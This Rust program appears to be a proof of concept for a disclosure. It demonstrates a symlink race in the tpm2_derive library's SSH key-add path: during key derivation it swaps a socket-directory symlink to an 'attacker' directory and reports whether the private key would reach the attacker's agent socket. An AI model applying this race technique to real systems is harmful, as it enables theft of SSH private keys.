use std::fs;
use std::os::unix::fs::{symlink, PermissionsExt};
use std::os::unix::net::UnixListener;
use std::path::{Path, PathBuf};
use std::sync::Mutex;

use secrecy::{ExposeSecret, SecretBox};
use tpm2_derive::backend::{CommandInvocation, CommandOutput, CommandRunner};
use tpm2_derive::model::{
    Algorithm, DerivationOverrides, Identity, IdentityModeResolution, Mode, ModePreference,
    SshAddRequest, StateLayout, UseCase,
};
use tpm2_derive::ops::seed::{
    HkdfSha256SeedDeriver, SeedBackend, SeedCreateRequest, SeedIdentity, SeedMaterial,
    SeedOpenAuthSource, SeedSoftwareDeriver, SoftwareSeedDerivationRequest,
};
use tpm2_derive::ops::ssh::{add_with_backend, SshAddClient};
use tpm2_derive::Result;
use zeroize::Zeroizing;

struct FakeSeedBackend;
impl SeedBackend for FakeSeedBackend {
    fn seal_seed(&self, _request: &SeedCreateRequest) -> Result<()> {
        Ok(())
    }

    fn unseal_seed(
        &self,
        _identity: &SeedIdentity,
        _auth_source: &SeedOpenAuthSource,
    ) -> Result<SeedMaterial> {
        Ok(SecretBox::new(Box::new(vec![0x44; 32])))
    }
}

struct NoopRunner;
impl CommandRunner for NoopRunner {
    fn run(&self, _invocation: &CommandInvocation) -> CommandOutput {
        CommandOutput {
            exit_code: Some(0),
            stdout: String::new(),
            stderr: String::new(),
            error: None,
        }
    }
}

struct SwappingDeriver {
    linkdir: PathBuf,
    attacker_dir: PathBuf,
    inner: HkdfSha256SeedDeriver,
}

impl SeedSoftwareDeriver for SwappingDeriver {
    fn derive(
        &self,
        seed: &SeedMaterial,
        request: &SoftwareSeedDerivationRequest,
    ) -> Result<SeedMaterial> {
        fs::remove_file(&self.linkdir).expect("remove original symlink");
        symlink(&self.attacker_dir, &self.linkdir).expect("swap symlink target");
        self.inner.derive(seed, request)
    }
}

#[derive(Default)]
struct RecordingClient {
    observed: Mutex<Vec<(PathBuf, PathBuf)>>,
}

impl SshAddClient for RecordingClient {
    fn add_private_key(&self, socket: &Path, _private_key_openssh: &Zeroizing<String>) -> Result<()> {
        let canonical = fs::canonicalize(socket).expect("canonicalize socket after swap");
        self.observed.lock().unwrap().push((socket.to_path_buf(), canonical));
        Ok(())
    }
}

fn main() -> Result<()> {
    let temp = tempfile::tempdir().expect("tempdir");
    let root = temp.path();
    let safe_dir = root.join("safe");
    let attacker_dir = root.join("attacker");
    fs::create_dir(&safe_dir).expect("safe dir");
    fs::create_dir(&attacker_dir).expect("attacker dir");
    fs::set_permissions(&safe_dir, fs::Permissions::from_mode(0o700)).unwrap();
    fs::set_permissions(&attacker_dir, fs::Permissions::from_mode(0o700)).unwrap();

    let safe_socket = safe_dir.join("agent.sock");
    let attacker_socket = attacker_dir.join("agent.sock");
    let _safe_listener = UnixListener::bind(&safe_socket).expect("bind safe socket");
    let _attacker_listener = UnixListener::bind(&attacker_socket).expect("bind attacker socket");

    let linkdir = root.join("linkdir");
    symlink(&safe_dir, &linkdir).expect("symlink linkdir -> safe");
    let symlink_socket = linkdir.join("agent.sock");

    let identity = Identity::new(
        "seed-ssh".to_string(),
        Algorithm::Ed25519,
        vec![UseCase::Sign, UseCase::Ssh, UseCase::ExportSecret],
        IdentityModeResolution {
            requested: ModePreference::Seed,
            resolved: Mode::Seed,
            reasons: vec!["seed requested".to_string()],
        },
        StateLayout::new(root.to_path_buf()),
    );

    let client = RecordingClient::default();
    let result = add_with_backend(
        &identity,
        &SshAddRequest {
            identity: identity.name.clone(),
            comment: Some("seed@test".to_string()),
            socket: Some(symlink_socket.clone()),
            state_dir: Some(root.to_path_buf()),
            reason: Some("demonstrate symlink race".to_string()),
            confirm: true,
            derivation: DerivationOverrides::default(),
        },
        &NoopRunner,
        &FakeSeedBackend,
        &SwappingDeriver {
            linkdir: linkdir.clone(),
            attacker_dir: attacker_dir.clone(),
            inner: HkdfSha256SeedDeriver,
        },
        &client,
    )?;

    let observed = client.observed.lock().unwrap();
    let (presented, canonical_after_swap) = observed.first().expect("observed client call");
    println!("accepted_request_socket={}", symlink_socket.display());
    println!("result_socket={}", result.socket.display());
    println!("client_presented_socket={}", presented.display());
    println!("canonical_socket_after_swap={}", canonical_after_swap.display());
    println!("safe_socket={}", safe_socket.display());
    println!("attacker_socket={}", attacker_socket.display());
    println!("swapped_to_attacker={}", canonical_after_swap == &attacker_socket);
    println!("result_path_is_noncanonical={}", result.socket != *canonical_after_swap);
    println!("derived_public_key_prefix={}", result.public_key_openssh.split_whitespace().next().unwrap_or(""));
    drop(observed);
    Ok(())
}
